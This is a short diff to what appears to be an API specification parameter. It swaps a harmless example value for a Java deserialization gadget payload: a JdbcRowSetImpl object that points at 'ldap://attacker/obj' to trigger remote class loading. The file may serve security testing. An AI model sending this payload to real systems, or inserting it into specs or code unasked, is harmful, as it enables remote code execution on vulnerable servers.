@@ -1,2 +1,4 @@
 in: path
-example: { "@class" : "package.InternationalNumber" }
+example: ["com.sun.rowset.JdbcRowSetImpl",{ "dataSourceName":
+"ldap://attacker/obj", "autoCommit" : true
+}]
